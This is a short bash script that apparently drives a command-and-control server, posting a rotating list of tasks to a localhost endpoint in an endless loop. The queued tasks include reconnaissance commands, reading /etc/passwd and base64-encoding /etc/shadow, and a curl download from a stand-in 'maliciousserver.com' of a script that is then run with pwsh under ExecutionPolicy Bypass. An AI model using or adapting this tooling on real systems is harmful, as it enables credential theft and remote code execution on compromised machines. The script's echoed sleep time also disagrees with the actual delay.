#!/bin/bash

# Set the base URL of your C2 server
C2_URL="http://localhost:5000/settask"

# Define the list of commands you want to rotate through
COMMANDS=(
  "whoami"
  "uname -a"
  "id"
  "cat /etc/passwd && cat /etc/shadow | base64"
  "curl -o /tmp/malicious.ps1 http://maliciousserver.com/script.ps1 && pwsh -ExecutionPolicy Bypass -File /tmp/malicious.ps1"

)

# Infinite loop through the commands
while true; do
  for CMD in "${COMMANDS[@]}"; do
    echo "[*] Setting task: $CMD"
    curl -s -X POST "$C2_URL" \
      -H "Content-Type: application/json" \
      -d "{\"cmd\":\"$CMD\"}"
    echo "[*] Task sent. Sleeping 10 seconds..."
    sleep 12
  done
done
